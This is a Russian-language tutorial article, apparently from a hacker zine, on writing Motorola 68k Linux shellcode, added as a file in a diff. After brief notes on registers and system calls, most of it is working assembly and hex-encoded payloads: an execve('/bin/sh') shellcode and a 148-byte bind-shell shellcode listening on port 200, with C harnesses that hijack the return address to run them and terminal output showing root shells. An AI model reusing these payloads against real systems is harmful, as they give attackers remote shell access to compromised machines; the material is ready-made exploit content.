@@ -1,0 +1,463 @@
+
+        ,┌s%$%s┐,      
+       ┌$$7"^"?$$L     
+      i$$',d$b,'$$;  
+yyyyyyyy$ $$$$$ $$l    m68k шелкоды под linux
+^^""¤¤¤"' '%$%',$$F    by madcr 
+             ,s$$?;,_             __,,__                          
+             '?$'j$$$$%syyy┌┌┌┌y╕$¤¤""^"¤
+                ^¤$$$¤¤"^             
+
+
+ I    Intro.
+ II   Регистры,Инструкции,Исключения.
+ III  Системные вызовы.
+ IV   Execve shellcode.
+ V    Bind-socket shellcode. 
+ VI   Cсылки.
+
+
+
+  Небольшое  вступление перед чтением статьи: в этом тексте рассматривается сам
+ принцип написания шелкода под данную платформу,и поэтому некоторых необходимых
+ в работоспособном шелкоде вещей (таких как setuid) здесь нет.Также встречаются
+ кое-где нули, поскольку заменить соответствующие инструкции на аналогичные, но
+ без нулей я думаю не составит для вас труда.Статья более для понимания принци-
+ па нежели для готового результата.
+
+
+ I. Introduction.
+
+
+  История motorola начинается аж с 1920года,когда они выпускали радиоэлементы и
+ о компьютерах еще никто не думал.Только в 1974 году, моторола выпускает первый
+ 8ми битный  микропроцессор - MC6800, содержащий 4000 транзисторов и уже в 1979
+ году моторола анонсирует первый 16ти битный процессор - MC68000, способный об-
+ рабатывать до 2  миллионов  операций в секунду. Спустя еще  5 лет, в 1984 году
+ motorola релизит первый 32х битный процессор (MC68020),содержащий 200000 тран-
+ зисторов.До 1994го года включительно моторола улучшала серию своих процессоров
+ и в итоге, в марте, подошла к выпуску MC68060 процессора площадь кристалла ко-
+ торого была 217 мм2 и содержал уже 2,5 млн.транзисторов.На данный момент 68060
+ является оптимальным процессором для использования unix.  
+
+  Процессор может  работать в 2 режимах: User и SuperVisor. Это не аналогия ре-
+ ального и защищенного режима работы x86 процессоров.Это своего рода защита "на
+ всякий случай". В  пользовательском режиме нельзя вызывать исключения и нельзя
+ иметь доступ ко всей области памяти. В supervisor режиме доступно все.Соответ-
+ ственно  операционные  системы работают в  supervisor режиме, а пользователи в
+ user.Соответственно с написанием linux под данную платформу проблем не возник-
+ ло. Ядро работает в supervisor режиме, остальное в user. 
+
+  MC68 поддерживают различные производители unix совместимых операционок, такие
+ как netbsd,openbsd,redhat linux,debian linux и тд. Данная статья ориентирована
+ на linux (в частности debian).
+
+
+ II. Регистры.
+
+
+  Процессор по сути своей CISC (но есть некоторые возможности RISC), соответст-
+ венно регистров не очень много:
+
+ Восемь регистров данных, с %d0 по %d7.
+ Восемь регистров адреса, с %a0 по %a7.
+ Регистр статуса - %sr.
+ Два стэковых указателя %sp и %fp.
+ Программный счетчик - %pc.
+
+ В принципе больше нам не понадобится ничего.И минимальный набор инструкций ко-
+ торый нам понадобится при разработке шелкода:
+
+
+ Инструкция              Пример                         Описание
+ 
+   move                movl %d0,%d1           занесли значение из %d0 в %d1
+   lea                 leal %sp@(0xc),%a0     вычисляем адрес по 0xc смещению 
+                                              в стэке и заносим его в %a0.
+   eor                 eorl %d0,%d1           xor
+   pea                 pea 0x2f2f7368         занесли в стэк '//sh'
+
+
+ Всего эти 4 инструкции будет достаточно для написания функционального шелкода.
+ И сейчас самое время сказать о пятой,самой главной инструкции и о исключениях.
+ Инструкция trap - вызов исключения. В процессорах моторола, всего 256 исключе-
+ ний, но из всех них нам необходимо только одно - trap #0.В mc68 linux'е на это
+ исключение повешен  переход к  ядру, для исполнения системного вызова. Trap #0
+ ссылается на вектор расположенный по адресу $80h ;) (странное совпадение). Те-
+ перь поподробнее остановимся на системных вызовах.
+
+ 
+
+ III.  Системные вызовы.
+
+ Системные вызовы на данной архитектуре организованы таким образом: 
+ 
+ %d0 - номер системного вызова
+ %d1,%d2,%d3 - аргументы 
+
+ Т.е. чтобы сделать банальный setuid(0); у нас выйдет нечто простенькое, типа:
+
+ eorl %d2,%d2
+ movl %d2,%d1
+ movl #23,%d0
+ trap #0
+
+ Довольно просто.
+
+
+  IV.  Execve shellcode.
+
+ Итак, начнем как всегда со старого доброго execve:
+
+.globl _start
+_start:
+.text
+	movl #11,%d0       /* execve()  (see unistd.h) */
+	movl #m1,%d1       /* /bin/sh address          */  
+ 	movl #m2,%d2       /* NULL                     */
+	movl #m2,%d3       /* NULL too                 */
+	trap #0
+.data
+m1: .ascii "/bin/sh\0"
+m1: .ascii "0\0".
+
+# as execve.s -o execve.o ; ld execve.o -o execve
+# ./execve
+sh-2.03# exit
+exit
+#
+
+ Такой код не пойдет,т.к. он не позицио-независимый и не проверяли его на нули.
+ Поэтому перепишем его с участием стэка (т.к. машина у нас big endian, то поря-
+ док следования байт нужно учитывать):
+
+.globl _start
+_start:
+        moveq #11,%d0         /* execve()            		    */
+	pea 0x2f2f7368        /* //sh                		    */
+ 	pea 0x2f62696e        /* /bin  (big endian)  		    */
+	movel %sp,%d1         /* /bin/sh in %d1      		    */
+	eorl %d2,%d2          /* pea 0x0 + avoiding  		    */
+	movel %d2,%sp@-       /* zero byte           		    */
+ 	pea 0x130             /* pea 0030 -> 0130 = kill the zero   */
+	movel %sp,%d2         /* NULL in %d2                        */
+	movel %d2,%d3         /* NULL in %d2                        */
+	trap #0               /* syscall                            */
+
+# as execve2.s -o execve2.o ; ld execve2.o -o execve2
+# ./execve2
+sh-2.03# exit
+exit
+#
+
+ Очень хорошо. Теперь переведем его в ascii и посмотрим, как это работает:
+
+/* 30 byte */
+
+char execve_shellcode[]=   
+"\x70\x0b"           	      /* moveq #11,%d0               */
+"\x48\x79\x2f\x2f\x73\x68"    /* pea 0x2f2f7368  -> //sh     */
+"\x48\x79\x2f\x62\x69\x6e"    /* pea 0x2f62696e  -> /bin     */
+"\x22\x0f"           	      /* movel %sp,%d1               */
+"\xb5\x82"           	      /* eorl %d2,%d2    ->          */
+"\x2f\x02"           	      /* movel %d2,%sp@- -> pea 0x0  */
+"\x48\x78\x01\x30"            /* pea 0x130                   */
+"\x24\x0f"           	      /* movel %sp,%d2               */
+"\x26\x02"           	      /* movel %d2,%d3               */
+"\x4e\x40";           	      /* trap #0                     */
+
+main()
+{
+ int *ret;
+ ret=(int *)&ret +2;
+ *ret = execve_shellcode;
+}
+
+
+# gcc execve_shellcode.c -o execve_shellcode
+# ./execve_shellcode
+sh-2.03# exit
+exit
+#
+
+ Вот наш шелкод. Отлично. Но этого конечно мало, поэтому повесим этот шелкод на
+ сокет.
+
+
+ V. Bind-socket shellcode. 
+
+Напишем 'bind-socket shellcode' сначала на С:
+
+#include <;;shiti;;>
+
+main()
+{
+    int fd,dupa;    
+    struct sockaddr_in se4v;
+
+    fd=socket(AF_INET,SOCK_STREAM,0);
+    se4v.sin_port=200;
+    se4v.sin_family=2;
+    se4v.sin_addr.s_addr=0;
+    
+    bind(fd,(struct sockaddr *)&se4v,sizeof(se4v));
+    listen(fd,1);
+    dupa=accept(fd,0,0);
+    dup2(dupa,0);
+    dup2(dupa,1);
+    dup2(dupa,2);
+    execl("/bin/sh","sh",0);
+}
+
+# gcc -static bindshell.c -o bindshell &
+# ./bindshell &
+[1] 276
+# netstat -an | grep 200
+tcp        0          0    0.0.0.0:200            0.0.0.0:*             LISTEN
+# telnet localhost 200
+Trying 127.0.01...
+Connected to localhost.
+Escape character is '^]'.
+echo aaaaaaaaaaaa
+aaaaaaaaaaaa
+ctrl+c
+[1]+ Done     ./bindshell
+
+
+ Все работает. Теперь последнее, что нас интересует это как идет работа с сетью
+
+# gdb -q ./bindshell
+(gdb) disas socket
+Dump of assembler code for function socket:
+0x80004734 <socket>:     moveal %d2,%a0
+0x80004736 <socket+2>:   moveq #102,%d0
+0x80004738 <socket+4>:   moveq #1,%d1
+0x8000473a <socket+6>:   lea %sp@(4),%a1
+0x8000473e <socket+10>:  movel %a1,%d2 
+0x80004740 <socket+12>:  trap #0 
+0x80004742 <socket+14>:  movel %a0,%d2
+0x80004744 <socket+16>:  tstl %d0
+0x80004746 <socket+18>:  bmil 0x80004958 <__syscall_error> 
+0x8000474c <socket+24>:  rts 
+0x8000474e <socket+26>:  rts
+End of assembler dump.
+(gdb)
+
+
+ Отлично. Как и везде - 102 = socket_call. 1 - sys_socket и тд. (для полного 
+ списка смотрите net.h). Исходя из вышесказанного напишем это на ассемблере:
+
+
+.globl _start
+_start:
+
+/* socket(AF_INET,SOCK_STREAM,0); ----------------------------------------- */
+/*                                                                          */
+/* Аргументы при работе с сокетами _не_ заносятся в регистры, в регистр за- */
+/* носится только адрес по которому они расположены (на x86 это ecx,на m68k */
+/* это d2)                                                                  */
+/* ------------------------------------------------------------------------ */ 
+
+/* af_inet - 2, sock_stream - 1, ip_proto0 - 0 */
+
+        moveq #2,%d0 
+	movl %d0,%sp@        /* sock_stream */ 
+	
+	moveq #1,%d0     
+	movel %d0,%sp@(0x4)   /* AF_INET     */
+		
+	eorl %d0,%d0
+	movl %d0,%sp@(0x8)
+	
+	movl %sp,%d2    /* ложим в d2 адрес в стэке, по которому лежат argv */
+	    	
+	movl #0x66,%d0   /* socketcall (asm/unistd.h) */
+	movl #1,%d1      /* sys_socket (linux/net.h)  */
+	trap #0          /* go on vector 80 */
+
+
+/* -bind(socket,(struct sockaddr *)&serv,sizeof(serv));-------------------- */
+
+  	movl %d0,%sp@    /* в d0 вернулся дескриптор на сокет, положим его  */
+	                 /* в стэк как первый аргумент (т.e. начали снова   */
+			 /* заполнять стэк аргументами)                     */
+	
+/* положим в стэк константы второго аргумента (sockaddr) (после аргументов, */
+/* которых будет 4) (поэтому и 0xc)                                         */
+
+/* стэк:   0-4   4-8   8-с       с-..n        */
+/*         1арг  2арг  3арг  константы 2арг   */
+
+        move #200,%d0
+	movl %d0,%sp@(0xc)   /* port number        */
+	
+	eorl %d0,%d0     
+	movl %d0,%sp@(0x10)    /* sin_addr.s_addr=0  */
+	
+	moveq #2,%d0     
+        movl %d0,%sp@(0x14)    /* sin_family=2       */   
+
+        leal %sp@(0xc),%a0    /* вычислим адрес расположения констант 2-го   */
+        movl %a0,%sp@(0x4)    /* аргумента и положим его как второй аргумент */
+
+	moveq #0x10,%d0
+	movl %d0,%sp@(0x8)  /* третий аргумент 0x10 */
+
+        movl #0x66,%d0        /* socketcall (asm/unistd.h) */
+	movl #2,%d1           /* sys_bind (linux/net.h)    */
+	trap #0               /* go on vector 80           */
+
+
+/* listen (socket,1); ----------------------------------------------------- */
+/* дескриптор сокета уже лежит в стэке первым аргументом, поэтому вбиваем   */ 
+/* после него второй                                                        */
+/*------------------------------------------------------------------------- */ 
+        moveq #1,%d0
+        movl %d0,%sp@(4)
+
+/* в d2 уже лежит адрес начала аргументов в стэке, поэтому пропускаем */
+         	
+	movl #0x66,%d0       /* scoketcall (asm/unistd.h) */
+	movl #4,%d1          /* sys_listen (linux/net.h)  */
+	trap #0              /* go on vector 80           */
+
+/* accept (fd,0,0); ------------------------------------------------------- */
+
+       eorl %d0,%d0
+       movl %d0,%sp@(4)
+       movl %d0,%sp@(8)
+
+
+       movl #0x66,%d0       /* scoketcall (asm/unistd.h) */
+       movl #5,%d1          /* sys_accept (linux/net.h)  */
+       trap #0              /* go on vector 80           */
+	
+/* dup2 (cli,0); ---------------------------------------------------------- */
+/* dup2 (cli,1); ---------------------------------------------------------- */
+/* dup2 (cli,2); ---------------------------------------------------------- */
+
+       movl %d0,%d1
+       movl #0x3f,%d0
+       movl #0,%d2 
+       trap #0
+
+       movl %d0,%d1
+       movl #0x3f,%d0 
+       movl #1,%d2 
+       trap #0
+
+       movl %d0,%d1
+       movl #0x3f,%d0 
+       movl #2,%d2 
+       trap #0
+       
+/* execve ("/bin/sh"); ----------------------------------------------------- */
+      
+      movl #11,%d0       /* execve */
+      pea 0x2f2f7368     /* //sh   */
+      pea 0x2f62696e     /* /bin   */ 
+      movl %sp,%d1       /*  /bin/sh in %d1 */
+
+      eorl %d2,%d2       
+      movl %d2,%sp@-     /* pea 0x0 */ 
+      pea 0x0130         /* 0030 -> 0130 = kill the zero */
+      
+      movl %sp,%d2
+      movl %d2,%d3 
+      trap #0
+
+/* ---EOF---bindsock shellcode--------------------------------------------- */
+
+
+# as bindshell.s -o bindshell.o ; ld bindshell.o -o bindshell
+# ./bindshell &
+[309]
+# telnet localhost 200
+Trying 127.0.01...
+Connected to localhost.
+Escape character is '^]'.
+echo aaaaaaaaaaaa
+aaaaaaaaaaaa
+ctrl+c
+
+
+ Вот в общем и все. Код конечно супер не оптимизированный, есть некоторые нули
+ которые банально убиваются, но общую картину я надеюсь предоставил. И напосле-
+ док то, как это должно быть:
+
+
+/* 148 byte */
+
+char bind_shellcode[]=
+"\x70\x02"           	      /*  moveq #2,%d0          */
+"\x2e\x80"           	      /*  movel %d0,%sp@        */
+"\x70\x01"           	      /*  moveq #1,%d0          */
+"\x2f\x40\x00\x04"     	      /*  movel %d0,%sp@(4)     */ 
+"\xb1\x80"           	      /*  eorl %d0,%d0          */
+"\x2f\x40\x00\x08"     	      /*  movel %d0,%sp@(8)     */ 
+"\x24\x0f"           	      /*  movel %sp,%d2         */
+"\x70\x66"           	      /*  moveq #102,%d0        */
+"\x72\x01"           	      /*  moveq #1,%d1          */
+"\x4e\x40"           	      /*  trap #0               */
+"\x2e\x80"           	      /*  movel %d0,%sp@        */
+"\x30\x3c\x00\xc8"     	      /*  movew #200,%d0        */
+"\x2f\x40\x00\x0c"     	      /*  movel %d0,%sp@(12)    */
+"\xb1\x80"           	      /*  eorl %d0,%d0          */ 
+"\x2f\x40\x00\x10"     	      /*  movel %d0,%sp@(16)    */
+"\x70\x02"           	      /*  moveq #2,%d0          */
+"\x2f\x40\x00\x14"            /*  movel %d0,%sp@(20)    */
+"\x41\xef\x00\x0c"     	      /*  lea %sp@(12),%a0      */
+"\x2f\x48\x00\x04"     	      /*  movel %a0,%sp@(4)     */
+"\x70\x10"           	      /*  moveq #16,%d0         */
+"\x2f\x40\x00\x08"     	      /*  movel %d0,%sp@(8)     */ 
+"\x70\x66"           	      /*  moveq #102,%d0        */ 
+"\x72\x02"           	      /*  moveq #2,%d1          */
+"\x4e\x40"           	      /*  trap #0               */
+"\x70\x01"           	      /*  moveq #1,%d0          */ 
+"\x2f\x40\x00\x04"     	      /*  movel %d0,%sp@(4)     */  
+"\x70\x66"           	      /*  moveq #102,%d0        */
+"\x72\x04"           	      /*  moveq #4,%d1          */
+"\x4e\x40"           	      /*  trap #0               */
+"\xb1\x80"           	      /*  eorl %d0,%d0          */  
+"\x2f\x40\x00\x04"     	      /*  movel %d0,%sp@(4)     */ 
+"\x2f\x40\x00\x08"     	      /*  movel %d0,%sp@(8)     */
+"\x70\x66"           	      /*  moveq #102,%d0        */
+"\x72\x05"           	      /*  moveq #5,%d1          */ 
+"\x4e\x40"           	      /*  trap #0               */
+"\x22\x00"           	      /*  movel %d0,%d1         */
+"\x70\x3f"           	      /*  moveq #63,%d0         */
+"\x74\x00"           	      /*  moveq #0,%d2          */ 
+"\x4e\x40"           	      /*  trap #0               */
+"\x22\x00"           	      /*  movel %d0,%d1         */
+"\x70\x3f"           	      /*  moveq #63,%d0         */
+"\x74\x01"           	      /*  moveq #1,%d2          */
+"\x4e\x40"           	      /*  trap #0               */  
+"\x22\x00"           	      /*  movel %d0,%d1         */
+"\x70\x3f"           	      /*  moveq #63,%d0         */
+"\x74\x02"           	      /*  moveq #2,%d2          */
+"\x4e\x40"           	      /*  trap #0               */
+"\x70\x0b"           	      /*  moveq #11,%d0         */ 
+"\x48\x79\x2f\x2f\x73\x68"    /*  pea 2f2f7368          */
+"\x48\x79\x2f\x62\x69\x6e"    /*  pea 2f62696e          */ 
+"\x22\x0f"           	      /*  movel %sp,%d1         */
+"\xb5\x82"           	      /*  eorl %d2,%d2          */
+"\x2f\x02"           	      /*  movel %d2,%sp@-       */
+"\x48\x78\x01\x30"            /*  pea 130               */
+"\x24\x0f"           	      /*  movel %sp,%d2         */ 
+"\x26\x02"           	      /*  movel %d2,%d3         */ 
+"\x4e\x40";           	      /*  trap #0               */
+
+main()
+{
+ int *ret;
+ ret=(int *)&ret +2;
+ *ret = bind_shellcode;
+}
+
+
+
+ VI. Ссылки.
+ 
+ [1] http://e-www.motorola.com/collateral/M68000PRM.pdf  - programmer's manual
+ [2] http://e-www.motorola.com/brdata/PDFDB/docs/MC68060UM.pdf - user's manual
+ [3] http://www.lsd-pl.net/documents/asmcodes-1.0.2.pdf        - good tutorial
